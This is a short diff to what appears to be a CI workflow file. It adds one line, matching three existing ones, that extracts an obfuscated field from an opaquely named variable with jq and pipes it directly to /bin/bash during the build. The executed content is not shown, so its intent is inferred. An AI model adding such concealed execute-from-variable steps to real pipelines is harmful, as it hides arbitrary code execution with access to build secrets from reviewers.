@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$lgq36" | jq -r .abgv98134 | /bin/bash
           echo $s3 | jq -r .heui3497 | /bin/bash
           printf '%s' "$rdr04726" | jq -r .u046 | /bin/bash
+          printf '%s' "$wi01" | jq -r .a8636 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
